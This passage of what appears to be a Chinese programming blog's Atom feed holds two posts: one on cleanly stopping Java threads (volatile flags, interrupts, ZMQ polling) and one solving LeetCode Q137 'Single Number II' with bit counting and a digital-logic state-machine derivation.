class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">stopMe</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        isStop = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(!isStop)&#123;</span><br><span class="line">            <span class="comment">// 处理逻辑</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里增加一个<code>volatile</code>标注的变量isStop来记录是否需要结束线程，<code>run()</code>中的死循环也由isStop变量操控。通过调用stopMe()方法改变变量的值，使死循环可以自行退出。</p><h2 id="捕获线程中断"><a class="markdownIt-Anchor" href="#捕获线程中断"></a> 捕获线程中断</h2><p>关于线程中断有Thread中有几个方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> Thread.interrupt() <span class="comment">// 中断一个线程</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">boolean</span> Thread.isInterrupted() <span class="comment">// 判断线程是否中断</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> Thread.interrupted() <span class="comment">// 判断是否中断，并清除中断位</span></span><br></pre></td></tr></table></figure><p>通过<code>Thread.interrupt()</code>方法可以设置一个线程的中断位，线程通过检查中断位来自行进行中断操作。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Thread2</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(!Thread.currentThread().isInterrupted()) &#123;</span><br><span class="line">            <span class="comment">// 处理逻辑</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                Thread.currentThread().interrupt(); <span class="comment">// 设置中断状态</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要注意的是一些阻塞方法像<code>sleep()</code>等会清除中断标志，所以在catch的时候需要重新设置一下中断标志。</p><h1 id="太忙的线程无法及时听到撤退的号角"><a class="markdownIt-Anchor" href="#太忙的线程无法及时听到撤退的号角"></a> 太忙的线程无法及时听到撤退的号角</h1><p>如果线程阻塞在一个事件上，那么给线程发送关闭消息，线程也无法及时的收到，只能等到事件出现，线程退出阻塞状态的时候才能接着进行下一步操作。</p><p>对于这种情况，起初也没有好的方法，于是就假想了一下：可以在通知线程关闭的时候，发送一个_假_的事件，让线程强行退出阻塞状态。但是这种使用假事件的方式很容易造成系统“混乱”，不是一个很好的方法。</p><p>如果一个线程阻塞在Socket通信上，可以在另一个线程上调用这个Socket的<code>close()</code>方法，这样会使其抛出<code>SocketException</code>而退出。官方文档没有提到这种方法，可以用来做个参考。</p><p>一个比较好的思路就是，改阻塞为非阻塞，这样线程就有足够的机会捕获到关闭消息。比如用NIO包中的Channel来管理Socket。</p><p>以ZMQ为例，通过<code>ZMQ.Poller</code>轮询避免阻塞的发生。以下代码是官方的示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.zeromq.ZMQ;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MSPoller</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span> <span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ZMQ.Context context = ZMQ.context(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Connect to task ventilator</span></span><br><span class="line">        ZMQ.Socket receiver = context.socket(ZMQ.PULL);</span><br><span class="line">        receiver.connect(<span class="string">&quot;tcp://localhost:5557&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//  Connect to weather server</span></span><br><span class="line">        ZMQ.Socket subscriber = context.socket(ZMQ.SUB);</span><br><span class="line">        subscriber.connect(<span class="string">&quot;tcp://localhost:5556&quot;</span>);</span><br><span class="line">        subscriber.subscribe(<span class="string">&quot;10001 &quot;</span>.getBytes());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//  Initialize poll set</span></span><br><span class="line">        ZMQ.Poller items = <span class="keyword">new</span> ZMQ.Poller (<span class="number">2</span>);</span><br><span class="line">        items.register(receiver, ZMQ.Poller.POLLIN);</span><br><span class="line">        items.register(subscriber, ZMQ.Poller.POLLIN);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//  Process messages from both sockets</span></span><br><span class="line">        <span class="keyword">while</span> (!Thread.currentThread ().isInterrupted ()) &#123;</span><br><span class="line">            <span class="keyword">byte</span>[] message;</span><br><span class="line">            items.poll();</span><br><span class="line">            <span class="keyword">if</span> (items.pollin(<span class="number">0</span>)) &#123;</span><br><span class="line">                message = receiver.recv(<span class="number">0</span>);</span><br><span class="line">                System.out.println(<span class="string">&quot;Process task&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (items.pollin(<span class="number">1</span>)) &#123;</span><br><span class="line">                message = subscriber.recv(<span class="number">0</span>);</span><br><span class="line">                System.out.println(<span class="string">&quot;Process weather update&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        receiver.close ();</span><br><span class="line">        context.term ();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总的来说，尽量通知线程自己去结束自己的任务，由此可以尽量避免一些意外情况的发生。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;含有死循环的线程是无法知道自己该什么时候结束的&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#含有死循环的线程是无法知道自己该什么时候结束的&quot;&gt;&lt;/a&gt; 含有死循环的线程是无法知道自己该什么时候结束的&lt;/h1&gt;
&lt;p&gt;一个工作线程需要不</summary>
      
    
    
    
    <category term="编程语言" scheme="https://sumygg.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"/>
    
    
    <category term="java" scheme="https://sumygg.com/tags/java/"/>
    
    <category term="thread" scheme="https://sumygg.com/tags/thread/"/>
    
    <category term="线程" scheme="https://sumygg.com/tags/%E7%BA%BF%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>LeetCode Q137 Single Number II的数电AC方法</title>
    <link href="https://sumygg.com/2017/04/27/single-number-ii-solved-using-circult-design-and-digital-logic/"/>
    <id>https://sumygg.com/2017/04/27/single-number-ii-solved-using-circult-design-and-digital-logic/</id>
    <published>2017-04-27T08:38:25.000Z</published>
    <updated>2021-03-16T08:51:02.963Z</updated>
    
    <content type="html"><![CDATA[<p>最近突然在LeetCode上刷起了题目，<a href="https://leetcode.com/problems/single-number-ii/#/description">Q137题</a>和好久之前做过的<a href="/2013/10/10/single-element-in-a-array/">数组中只出现过一次的元素</a>类似。一个数组中有一些整数，这些数要不出现3次，要不只出现1次，并且出现1次的数字只有一个，找出那个出现一次的数字。</p><h1 id="朴素的解法"><a class="markdownIt-Anchor" href="#朴素的解法"></a> 朴素的解法</h1><p>根据之前的思路，可以弄一个大小32的数组，将数字对应的二进制位累计到对应的数组中，对数组模3后，剩下的数字就是只出现一次的数字。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">singleNumber</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span>[] bts = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">32</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> num : nums) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; bts.length; i++) &#123;</span><br><span class="line">            bts[i] += ((num &gt;&gt; i) &amp; <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; bts.length; i++) &#123;</span><br><span class="line">        ans |= (bts[i] % <span class="number">3</span> &lt;&lt; i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个思路很好理解，也顺利解决了问题，但是在看其他人的解法时发现了一种奇特的解法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">singleNumber</span><span class="params">(<span class="keyword">int</span>[] A)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ones = <span class="number">0</span>, twos = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; A.length; i++)&#123;</span><br><span class="line">        ones = (ones ^ A[i]) &amp; ~twos;</span><br><span class="line">        twos = (twos ^ A[i]) &amp; ~ones;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ones;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>完全无法理解<img class="emoji" draggable="false" alt="😱" src="https://twemoji.maxcdn.com/2/72x72/1f631.png"/>。。。经过舍友的指点，原来灵感来自 <strong>数字电路</strong> 的范畴。本科期间也学过一些数字电路的知识，现在大部分已经还给老师了，根据记忆稍微弄一弄吧。</p><h1 id="模型抽象三进制加法"><a class="markdownIt-Anchor" href="#模型抽象三进制加法"></a> 模型抽象——三进制加法</h1><p>分析问题，原问题可以抽象成一个三进制的加法。有三个状态，保证累加到3个数字后可以抵消掉变为0，于是可以得到如下的状态转移图：</p><img src="/2017/04/27/single-number-ii-solved-using-circult-design-and-digital-logic/1.png" class="" title="状态转移图"><p>这个状态的图的状态不需要化简，现在为其分配状态值。共有三个状态，需要2位表示。</p><blockquote><p>A – 00<br />B – 01<br />C – 10</p></blockquote><p>根据状态转移图，画出状态转移表。</p><img src="/2017/04/27/single-number-ii-solved-using-circult-design-and-digital-logic/2.png" class="" title="状态转移表"><p>按位拆分状态转移表，通过卡诺图，化简表达式。</p><p>这个卡诺图是按照高位画出的：</p><img src="/2017/04/27/single-number-ii-solved-using-circult-design-and-digital-logic/3.png" class="" title="卡诺图1"><p>同理，低位的同样画出：</p><img src="/2017/04/27/single-number-ii-solved-using-circult-design-and-digital-logic/4.png" class="" title="卡诺图2"><p>将相邻的“1”用红圈圈出，写出表达式：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>F</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">F_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>表示高位， <span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>F</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">F_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>表示低位。</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>F</mi><mn>1</mn></msub><mo>=</mo><mi>X</mi><mover accent="true"><mi>Z</mi><mo stretchy="true">‾</mo></mover><mo>+</mo><mi>Y</mi><mi>Z</mi></mrow><annotation encoding="application/x-tex">F_1=X\overline{Z}+YZ</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.9666600000000001em;vertical-align:-0.08333em;"></span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mord overline"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8833300000000001em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">Z</span></span></span><span style="top:-3.80333em;"><span class="pstrut" style="height:3em;"></span><span class="overline-line" style="border-bottom-width:0.04em;"></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.22222em;">Y</span><span class="mord mathdefault" style="margin-right:0.07153em;">Z</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>F</mi><mn>2</mn></msub><mo>=</mo><mi>Y</mi><mover accent="true"><mi>Z</mi><mo stretchy="true">‾</mo></mover><mo>+</mo><mover accent="true"><mi>X</mi><mo stretchy="true">‾</mo></mover><mover accent="true"><mi>Y</mi><mo stretchy="true">‾</mo></mover><mi>Z</mi></mrow><annotation encoding="application/x-tex">F_2=Y\overline{Z}+\overline{X}\overline{Y}Z</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.9666600000000001em;vertical-align:-0.08333em;"></span><span class="mord mathdefault" style="margin-right:0.22222em;">Y</span><span class="mord overline"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8833300000000001em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">Z</span></span></span><span style="top:-3.80333em;"><span class="pstrut" style="height:3em;"></span><span class="overline-line" style="border-bottom-width:0.04em;"></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8833300000000001em;vertical-align:0em;"></span><span class="mord overline"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8833300000000001em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">X</span></span></span><span style="top:-3.80333em;"><span class="pstrut" style="height:3em;"></span><span class="overline-line" style="border-bottom-width:0.04em;"></span></span></span></span></span></span><span class="mord overline"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8833300000000001em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.22222em;">Y</span></span></span><span style="top:-3.80333em;"><span class="pstrut" style="height:3em;"></span><span class="overline-line" style="border-bottom-width:0.04em;"></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.07153em;">Z</span></span></span></span></p><p>不容易，一步一百度，终于搞出了这个式子了。</p><h1 id="程序编写"><a class="markdownIt-Anchor" href="#程序编写"></a> 程序编写</h1><p>根据上面得到的两个表达式，可以写出以下的程序：</p><p>高位用变量a表示表达式中的X，低位用变量b表示表达式中的Y，输入Z就是数组中的数字了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">singleNumber</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> b = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> num : nums) &#123;</span><br><span class="line">        <span class="keyword">int</span> ta = (a &amp; ~num) | (b &amp; num);</span><br><span class="line">        <span class="keyword">int</span> tb = (b &amp; ~num) | (~a &amp; ~b &amp; num);</span><br><span class="line">        a = ta;</span><br><span class="line">        b = tb;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>提交测试一下，AC了。。。又解决了一个题目，可喜可贺<img class="emoji" draggable="false" alt="😛" src="https://twemoji.maxcdn.com/2/72x72/1f61b.png"/>。。。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;最近突然在LeetCode上刷起了题目，&lt;a href=&quot;https://leetcode.com/problems/single-number-ii/#/description&quot;&gt;Q137题&lt;/a&gt;和好久之前做过的&lt;a href=&quot;/2013/10/10/single-e</summary>
      
    
    
    
    <category term="算法" scheme="https://sumygg.com/categories/%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="算法" scheme="https://sumygg.com/tags/%E7%AE%97%E6%B3%95/"/>
    
    <category term="面试" scheme="https://sumygg.com/tags/%E9%9D%A2%E8%AF%95/"/>
    
    <category term="数字电路" scheme="https://sumygg.com/tags/%E6%95%B0%E5%AD%97%E7%94%B5%E8%B7%AF/"/>
    
  </entry>
  
</feed>
